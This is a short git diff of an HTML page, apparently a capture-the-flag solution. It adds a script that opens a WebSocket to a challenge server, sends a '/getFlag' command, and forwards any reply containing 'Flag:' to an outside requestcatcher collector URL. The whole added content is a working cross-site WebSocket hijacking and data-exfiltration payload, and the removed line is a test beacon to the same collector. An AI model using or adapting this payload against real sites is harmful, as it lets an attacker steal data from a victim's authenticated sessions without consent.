@@ -6,6 +6,17 @@
     <title>Document</title>
 </head>
 <body>
-    <script>fetch('https://cookie.requestcatcher.com/test')</script>
+    <script>
+
+         const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ message: '/getFlag' }));
+      };
+      ws.onmessage = (event) => {
+        if (event.data.includes('Flag:')) {
+          fetch('https://cookie.requestcatcher.com/test?flag=' + encodeURIComponent(event.data));
+        }
+      };
+    </script>
 </body>
 </html>
